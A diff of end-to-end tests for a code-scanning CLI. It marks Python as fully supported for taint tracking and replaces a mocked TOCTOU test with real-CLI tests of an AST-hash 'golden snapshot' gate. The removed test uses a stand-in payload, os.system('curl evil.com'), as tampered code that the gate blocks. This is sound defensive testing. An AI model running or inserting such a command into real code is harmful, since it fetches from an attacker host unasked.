@@ -34,8 +34,8 @@ describe("Production Fixes E2E Tests", () => {
 		expect(result.stderr).not.toContain("Linux/Windows support is planned");
 	});
 
-	test("JSON-v2 and SARIF output correctly flag Python files as unsupported for Taint Tracking", () => {
-		const pythonFile = path.join(scratchDir, "unsupported.py");
+	test("JSON-v2 and SARIF report taint status; Python is now fully supported", () => {
+		const pythonFile = path.join(scratchDir, "pysupported.py");
 		fs.writeFileSync(pythonFile, "import os\nos.system('echo hi')");
 
 		const jsFile = path.join(scratchDir, "supported.js");
@@ -56,13 +56,16 @@ describe("Production Fixes E2E Tests", () => {
 		}
 
 		const jsonContent = JSON.parse(fs.readFileSync(jsonOutFile, "utf-8"));
-		
+
 		expect(jsonContent).toHaveProperty("files_status");
-		const pyStatus = jsonContent.files_status.find((s: any) => s.file.includes("unsupported.py"));
+		const pyStatus = jsonContent.files_status.find((s: any) => s.file.includes("pysupported.py"));
 		const jsStatus = jsonContent.files_status.find((s: any) => s.file.includes("supported.js"));
 
-		expect(pyStatus.status).toBe("unsupported_taint_tracking");
+		// Python now has real taint tracking (parity with JS/TS), and every file
+		// carries a golden-snapshot AST hash.
+		expect(pyStatus.status).toBe("scanned_full");
 		expect(jsStatus.status).toBe("scanned_full");
+		expect(pyStatus.ast_hash).toMatch(/^sha256-ast:/);
 
 		const sarifOutFile = path.join(scratchDir, "out.sarif");
 
@@ -74,83 +77,57 @@ describe("Production Fixes E2E Tests", () => {
 		);
 
 		const sarifContent = JSON.parse(fs.readFileSync(sarifOutFile, "utf-8"));
-		
+
 		const artifacts = sarifContent.runs[0].artifacts;
-		const pyArtifact = artifacts.find((a: any) => a.location.uri.includes("unsupported.py"));
+		const pyArtifact = artifacts.find((a: any) => a.location.uri.includes("pysupported.py"));
 		const jsArtifact = artifacts.find((a: any) => a.location.uri.includes("supported.js"));
 
-		expect(pyArtifact.properties.status).toBe("unsupported_taint_tracking");
+		expect(pyArtifact.properties.status).toBe("scanned_full");
 		expect(jsArtifact.properties.status).toBe("scanned_full");
+		expect(pyArtifact.properties.astHash).toMatch(/^sha256-ast:/);
 	});
 
-	test("Golden Snapshots block execution if file is tampered with TOCTOU", async () => {
-		const { spyOn } = require("bun:test");
-		const { runAgent } = require("./commands/run");
-		const childProcess = require("node:child_process");
+	test("Golden Snapshot: run blocks when the pinned --ast-hash no longer matches", () => {
+		// Runs the real CLI in a node subprocess (where tree-sitter loads). The
+		// block happens at the AST-hash gate, before the sandbox is ever launched,
+		// so this holds even without the sandbox binary present.
+		const target = path.join(scratchDir, "pinned.py");
+		fs.writeFileSync(target, "print('the originally-scanned tool')");
 
-		const dummyTarget = path.join(scratchDir, "dummy-toctou.py");
-		
-		// Mock process.exit so we don't kill the test runner when execution is blocked
-		const exitSpy = spyOn(process, "exit").mockImplementation((code: number) => {
-			throw new Error(`process.exit called with ${code}`);
+		const result = spawnSync(
+			"node",
+			[cliPath, "run", target, "--experimental", "--ast-hash", "sha256-ast:deadbeefdeadbeef"],
+			{ encoding: "utf-8" }
+		);
+
+		const out = (result.stdout || "") + (result.stderr || "");
+		expect(out).toContain("SECURITY VIOLATION");
+		expect(out).toContain("changed after it was scanned");
+		// It must NOT have reached execution.
+		expect(out).not.toContain("SANDBOX STDOUT");
+		expect(result.status).not.toBe(0);
+	});
+
+	test("Golden Snapshot: run proceeds when the pinned --ast-hash matches", () => {
+		const target = path.join(scratchDir, "matching.py");
+		fs.writeFileSync(target, "print('trusted tool')");
+
+		// Obtain the real AST hash via `check`.
+		const jsonOut = path.join(scratchDir, "match.json");
+		spawnSync("node", [cliPath, "check", target, "--format", "json-v2", "--output", jsonOut], {
+			encoding: "utf-8",
 		});
-		
-		// Capture stderr to assert the right security message is logged
-		let stderr = "";
-		const errSpy = spyOn(console, "error").mockImplementation((...args: any[]) => {
-			stderr += args.join(" ") + "\n";
-		});
+		const hash = JSON.parse(fs.readFileSync(jsonOut, "utf-8")).files_status[0].ast_hash;
+		expect(hash).toMatch(/^sha256-ast:/);
 
-		// Deterministic TOCTOU Mock: 
-		// Return 'safe' code during the Time-of-Check (Golden Snapshot generation).
-		// Return 'malicious' code during the Time-of-Use (Verification Gate).
-		const originalRead = fs.readFileSync;
-		let readCount = 0;
-		const readSpy = spyOn(fs, "readFileSync").mockImplementation((p: any, o: any) => {
-			if (typeof p === "string" && p.endsWith("dummy-toctou.py")) {
-				readCount++;
-				if (readCount === 1) return "print('safe')"; // Time of Check
-				if (readCount === 2) return "import os; os.system('curl evil.com')"; // Time of Use
-			}
-			return originalRead(p, o as any) as any;
-		});
-
-		// Mock existsSync so runAgent bypasses initial file presence checks
-		const originalExists = fs.existsSync;
-		const existsSpy = spyOn(fs, "existsSync").mockImplementation((p: any) => {
-			if (typeof p === "string" && p.endsWith("dummy-toctou.py")) return true;
-			if (typeof p === "string" && p.endsWith("wh-sandbox")) return true;
-			return originalExists(p);
-		});
-
-		// Mock spawnSync to definitively prove that IPC sandbox execution NEVER OCCURS
-		const spawnSpy = spyOn(childProcess, "spawnSync").mockImplementation(() => {
-			throw new Error("Sandbox was executed despite TOCTOU mismatch!");
-		});
-
-		try {
-			// This invokes the actual CLI pipeline synchronously inside the test
-			await runAgent(dummyTarget, "");
-		} catch (err: any) {
-			// Assert that process.exit(1) was called via our mock exception
-			expect(err.message).toBe("process.exit called with 1");
-		}
-
-		// Assertions requested by user:
-		
-		// 1. Definitively assert the tampered payload side-effect never happened.
-		// Mocking spawnSync proves execution was blocked at the boundary.
-		expect(spawnSpy).not.toHaveBeenCalled();
-		
-		// 2. Sandbox never actually executed the payload (proper security error printed)
-		expect(stderr).toContain("SECURITY VIOLATION: Execution Blocked");
-		expect(stderr).toContain("Payload signature mismatch detected");
-		
-		// Clean up
-		exitSpy.mockRestore();
-		errSpy.mockRestore();
-		readSpy.mockRestore();
-		existsSpy.mockRestore();
-		spawnSpy.mockRestore();
+		const result = spawnSync(
+			"node",
+			[cliPath, "run", target, "--experimental", "--ast-hash", hash],
+			{ encoding: "utf-8" }
+		);
+		const out = (result.stdout || "") + (result.stderr || "");
+		// The AST-hash gate must pass (no violation); it then proceeds to the sandbox.
+		expect(out).not.toContain("SECURITY VIOLATION");
+		expect(out).toContain(hash);
 	});
 });
